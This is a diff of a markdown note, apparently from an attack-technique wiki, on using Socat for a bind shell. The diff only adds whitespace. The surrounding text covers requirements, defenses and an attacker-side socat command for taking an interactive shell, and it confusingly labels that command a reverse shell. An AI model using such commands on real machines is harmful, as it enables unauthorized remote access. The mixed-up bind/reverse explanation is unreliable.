@@ -33,11 +33,15 @@ Technical Explanation: The attacker first needs to upload and execute the Socat 
 
 Business Value: The Socat Bind Shell can be used by attackers to gain remote access to a target machine, bypassing any firewall or network restrictions. This can lead to the theft of sensitive information, installation of malware, or further attacks. By understanding and implementing measures to secure against this type of attack, organizations can protect their assets and reputation.
 
+ 
+
 ## Requirements
 
 1. Ability to upload and execute Socat binary on the target machine
 
 1. Network access to the target machine
+
+ 
 
 ## Defense
 
@@ -47,17 +51,27 @@ Business Value: The Socat Bind Shell can be used by attackers to gain remote acc
 
 1. Regularly update and patch software to prevent known vulnerabilities from being exploited
 
+ 
+
 ## Objectives
 
 1. Gain remote access to a target machine
 
 1. Execute commands on the target machine
 
+ 
+
 # Instructions
 
 1. This command is used to establish a reverse shell connection using the socat utility. The attacker machine initiates the connection to the victim machine and sends a shell command to be executed on the victim machine. This allows the attacker to gain remote access to the victim machine.
 
+ 
+
+
+
 **Code**: [[user@attacker$ socat FILE:`tty`,raw,echo=0 TCP:tar]]
+
+
 
 > The command consists of two parts, one for the attacker machine and one for the victim machine. 
 
@@ -81,3 +95,5 @@ On the victim machine, the command starts with the socat utility followed by the
 
 - [[Bind Shell]]
 - [[Socat]]
+
+
